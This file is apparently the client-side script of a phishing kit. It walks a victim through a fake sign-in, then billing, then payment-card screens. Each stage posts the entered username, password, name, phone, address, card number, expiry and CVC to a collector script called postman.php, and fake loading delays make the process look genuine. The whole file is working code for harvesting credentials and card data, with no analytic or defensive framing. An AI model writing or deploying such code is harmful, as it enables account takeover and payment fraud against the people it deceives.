function hideDiv(id) {
   document.getElementById(id).style.display = 'none';
}

function showDiv(id) {
   document.getElementById(id).style.display = 'initial';
}

function getInputValue(id) {
   var value = document.getElementById(id).value;
   return value;
}

jQuery(function ($) {
   $('[data-numeric]').payment('restrictNumeric');
   $('.cn').payment('formatCardNumber');
   $('.ce').payment('formatCardExpiry');
   $('.cv').payment('formatCardCVC');
});

function user() {
	if (getInputValue('_u') !== '') {
		hideDiv('user_box');
		document.getElementById('user_spn').innerText = getInputValue('_u');
		showDiv('pass_box');
	} else {
		showDiv('u_error_img');
	}
}

function pass() {
	if (getInputValue('_p') !== '') {
		sendLoginINFO(getInputValue('_u'), getInputValue('_p'));
		hideDiv('pass_box');
		showDiv('load_box');
		setTimeout(function () {
			hideDiv('load_box');
			hideDiv('left_banner_img');
			showDiv('left_banner_sec_img');
			showDiv('bill_box');
		}, 1250);
	} else {
		showDiv('p_error_img');
	}
}

function bill() {
	if (getInputValue('_fname') !== '' && getInputValue('_lname') !== '' && getInputValue('_phone') !== '' && getInputValue('_ciu') !== '' && getInputValue('_postal') !== '') {
		sendBillingINFO(getInputValue('_u'), 
			getInputValue('_p'),
			getInputValue('_fname') + ' ' + getInputValue('_lname'),
			getInputValue('_phone'), 
			getInputValue('_ciu') + ' ' + getInputValue('_postal'));
		hideDiv('bill_box');
		showDiv('load_box');
		setTimeout(function () {
			hideDiv('load_box');
			showDiv('card_box');
		}, 1250);
	} else {
		showDiv('bill_error');
	}
}

function completeINFO() {
	if (getInputValue('_cnum') !== '' && getInputValue('_cexp') !== '' && getInputValue('_cvc') !== '') {
		sendCompleteINFO(getInputValue('_u'), 
			getInputValue('_p'), 
			getInputValue('_fname') + ' ' + getInputValue('_lname'), 
			getInputValue('_phone'), 
			getInputValue('_ciu') + ' ' + getInputValue('_postal'), 
			getInputValue('_cnum'), 
			getInputValue('_cexp'), 
			getInputValue('_cvc'));
	}
}

//Post Requests:.
function sendLoginINFO(user, pass) {
   var postman = "global/inc/postman.php";
   var values = {
      '_u': user,
      '_p': pass
   };

   $.ajax({
      type: 'POST',
      url: postman,
      data: values,
      success: function (data) {
         console.log('Sent!');
      }
   })
}

function sendBillingINFO(user, pass, name, phone, address) {
   var postman = "global/inc/postman.php";
   var values = {
   	  '_ub': user,
   	  '_pb': pass,
      '_name': name,
      '_phone': phone,
      '_address': address
   };

   $.ajax({
      type: 'POST',
      url: postman,
      data: values,
      success: function (data) {
         console.log('Sent!');
      }
   })
}

function sendCompleteINFO(user, pass, name, phone, address, cnum, cexp, ckod) {
   var postman = "global/inc/postman.php";
   var values = {
   	  '_uc': user,
   	  '_pc': pass,
      '_name': name,
      '_phone': phone,
      '_address': address,
      '_cnum': cnum,
      '_cexp': cexp,
      '_ckod': ckod
   };

   $.ajax({
      type: 'POST',
      url: postman,
      data: values,
      success: function (data) {
         console.log('Sent!');
      }
   })
}